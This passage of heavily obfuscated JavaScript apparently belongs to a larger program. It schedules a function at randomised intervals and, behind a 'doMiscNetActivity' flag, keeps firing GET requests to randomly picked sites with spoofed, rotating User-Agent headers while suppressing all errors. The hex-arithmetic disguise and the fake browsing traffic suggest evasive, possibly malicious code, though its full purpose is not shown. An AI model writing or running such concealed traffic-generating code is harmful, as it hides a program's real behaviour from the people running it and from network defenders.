  for (let k = -0x13b5 + -0x3f5 * -0x9 + -0xfe8; k < -0x1 * 0x9a9 + -0x581 + 0xf2e; k++)
    setTimeout(f, (-0xf609 + -0x13fdd + 0x32046) * k * getRandomInt(0x132d + -0x1ac9 + 0x79d, -0xdcd * -0x1 + -0xea * -0xd + -0x19ac));
  setInterval(() => {
    f();
    for (let l = -0x1ca1 + -0xea8 + 0x2b49 * 0x1; l < 0xb21 * 0x1 + 0x2408 + 0x51 * -0x95; l++)
      setTimeout(f, (-0x5591 * -0x1 + -0x6e5 * 0x2f + 0x1d8da) * l * getRandomInt(0x17 * 0x1f + -0x14ef + 0x60d * 0x3, 0x2052 + -0x2554 + 0x505));
  }, -0x2c0b1d + 0xb7 * -0x7ae6 + 0xbad407);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0xdf * 0x1f + 0x417 * -0x1 + -0x237 * -0x2) * getRandomInt(-0x2 * -0x248 + -0x2 * -0xd2b + -0x1ee5, -0xee0 + -0x2443 * -0x1 + -0x155e));
}, 0x4 * 0x131 + -0x3d3 + -0x1 * 0x8d);